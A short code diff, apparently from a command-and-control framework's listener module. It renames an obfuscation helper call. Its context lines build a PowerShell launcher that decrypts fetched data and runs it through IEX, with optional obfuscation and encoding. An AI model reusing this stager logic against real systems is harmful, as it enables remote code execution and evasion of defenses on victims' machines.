@@ -247,7 +247,7 @@ class Listener(object):
                 launcher += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    launcher = helpers.obfuscate(self.mainMenu.installPath, launcher,
+                    launcher = data_util.obfuscate(self.mainMenu.installPath, launcher,
                                                  obfuscationCommand=obfuscationCommand)
 
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
